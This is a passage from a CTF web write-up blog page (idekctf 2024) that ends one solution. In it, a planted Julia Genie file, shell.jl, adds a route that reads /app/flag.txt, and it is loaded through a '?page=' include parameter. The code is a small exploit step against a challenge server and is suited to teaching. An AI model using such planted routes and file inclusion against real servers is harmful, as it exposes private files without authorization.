<span class="k">using</span> <span class="n">Genie</span><span class="x">,</span> <span class="n">Genie</span><span class="o">.</span><span class="n">Router</span><span class="x">,</span> <span class="n">Genie</span><span class="o">.</span><span class="n">Renderer</span><span class="o">.</span><span class="n">Html</span>

<span class="n">route</span><span class="x">(</span><span class="s">"/flag"</span><span class="x">)</span> <span class="k">do</span>
  <span class="n">flag_content</span> <span class="o">=</span> <span class="k">try</span>
    <span class="n">read</span><span class="x">(</span><span class="s">"/app/flag.txt"</span><span class="x">,</span> <span class="kt">String</span><span class="x">)</span>
  <span class="k">catch</span> <span class="n">e</span>
    <span class="s">"Error: Could not read /app/flag.txt"</span>
  <span class="k">end</span>

  <span class="n">html</span><span class="x">(</span><span class="s">"""
  &lt;h1&gt;Flag Content&lt;/h1&gt;
  &lt;pre&gt;</span><span class="si">$(flag_content)</span><span class="s">&lt;/pre&gt;
  """</span><span class="x">)</span>
<span class="k">end</span>

<span class="n">Genie</span><span class="o">.</span><span class="n">Server</span><span class="o">.</span><span class="n">up</span><span class="x">(;</span> <span class="n">open_browser</span> <span class="o">=</span> <span class="nb">false</span><span class="x">,</span> <span class="n">async</span> <span class="o">=</span> <span class="nb">false</span><span class="x">)</span>
</pre></table></code></div></div><p>Lastly, we must now include it (<code class="language-plaintext highlighter-rouge">/?page=shell.jl</code>). Then we may visit <code class="language-plaintext highlighter-rouge">/flag</code> and it will display the flag.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=idekctf 2024 Web Writeups - Ireland.RE&amp;url=https://ireland.re/posts/idekctf_2024/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=idekctf 2024 Web Writeups - Ireland.RE&amp;u=https://ireland.re/posts/idekctf_2024/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/idekctf_2024/&amp;text=idekctf 2024 Web Writeups - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_CTF_2023_Web/"><div class="card-body"> <em class="timeago small" data-ts="1702857600" > 2023-12-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor CTF 2023 Web Challenges</h3><div class="text-muted small"><p> web/too-many-admins Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql). I immediately noticed the SQL injection h...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HitconCTF_2024/" class="btn btn-outline-primary" prompt="Older"><p>Hitcon CTF 2024 RClonE</p></a> <a href="/posts/irisctf_2025/" class="btn btn-outline-primary" prompt="Newer"><p>irisctf 2025 Web Writeups</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
